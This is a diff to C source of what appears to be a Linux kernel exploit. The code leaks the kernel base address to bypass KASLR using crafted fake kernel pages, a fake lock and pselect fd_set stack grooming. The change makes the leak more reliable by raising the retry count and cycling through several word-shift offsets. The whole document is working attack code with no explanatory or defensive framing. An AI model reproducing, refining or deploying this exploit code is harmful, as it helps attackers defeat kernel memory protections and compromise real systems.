@@ -1,12 +1,12 @@
 #include "common.h"
 
-#define SLIDE_MAX_ATTEMPTS 20
+#define SLIDE_MAX_ATTEMPTS 40
 #define SLIDE_CONSUME_DELAY 2000
 #define SLIDE_CONSUME_USEC 0
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
-#define SLIDE_PSELECT_WORD_SHIFT 0
-#define SLIDE_WAIT_SECONDS 30
+#define SLIDE_PSELECT_WORD_SHIFT_BASE 0
+#define SLIDE_WAIT_SECONDS 10
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
@@ -26,13 +26,15 @@ static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
 
+static int slide_word_shift;
+
 int slide_pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
   return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
 }
 
 int slide_pselect_global_word(int waiter_word) {
-  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
+  return slide_word_shift + waiter_word;
 }
 
 int slide_pselect_put_global_word(
@@ -94,7 +96,8 @@ void slide_pselect_put_waiter_word(
   }
 }
 
-void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
+static void prepare_slide_pselect_fdsets_shifted(
+    fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
   FD_ZERO(ex);
@@ -165,7 +168,7 @@ void slide_pselect_stack_copy(void) {
   fd_set in;
   fd_set out;
   fd_set ex;
-  prepare_slide_pselect_fdsets(&in, &out, &ex);
+  prepare_slide_pselect_fdsets_shifted(&in, &out, &ex);
   open_slide_selected_fds(&in, &out, &ex, high_read);
 
   atomic_store(&slide_consume_stop, 0);
@@ -191,11 +194,12 @@ void slide_pselect_stack_copy(void) {
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
   pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
-          "last_sched_ret=%d last_sched_errno=%d\n",
+          "last_sched_ret=%d last_sched_errno=%d shift=%d\n",
           ret, saved_errno, atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
-          atomic_load(&slide_consume_last_sched_errno));
+          atomic_load(&slide_consume_last_sched_errno),
+          slide_word_shift);
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -397,6 +401,7 @@ uint64_t slide_read_stext(void) {
              getpid(), (unsigned long long)stext);
   return stext;
 }
+
 uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
@@ -422,7 +427,12 @@ uint64_t slide_child_leak_stext(void) {
 }
 
 int slide_leak_kernel_base(void) {
+  int shifts[] = {0, 1, 2, 3, -1, -2};
+  int n_shifts = sizeof(shifts) / sizeof(shifts[0]);
+
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
+    slide_word_shift = shifts[(attempt - 1) % n_shifts];
+
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
       continue;
@@ -455,20 +465,20 @@ int slide_leak_kernel_base(void) {
     SYSCHK(close(fds[0]));
     int status = 0;
     SYSCHK(waitpid(child, &status, 0));
-    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
-        WEXITSTATUS(status) != 0 || !stext) {
-      pr_warning("slide attempt %d failed n=%zd status=%d\n",
-                 attempt, n, status);
-      continue;
+
+    if (n == (ssize_t)sizeof(stext) && WIFEXITED(status) &&
+        WEXITSTATUS(status) == 0 && stext) {
+      kaslr_base = stext;
+      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+      kaslr_done = 1;
+      pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx shift=%d\n",
+                 getpid(), (unsigned long long)kaslr_base,
+                 (unsigned long long)kaslr_slide, slide_word_shift);
+      return 1;
     }
 
-    kaslr_base = stext;
-    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
-    kaslr_done = 1;
-    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
-               getpid(), (unsigned long long)kaslr_base,
-               (unsigned long long)kaslr_slide);
-    return 1;
+    pr_warning("slide attempt %d failed n=%zd status=%d shift=%d\n",
+               attempt, n, status, slide_word_shift);
   }
 
   return 0;
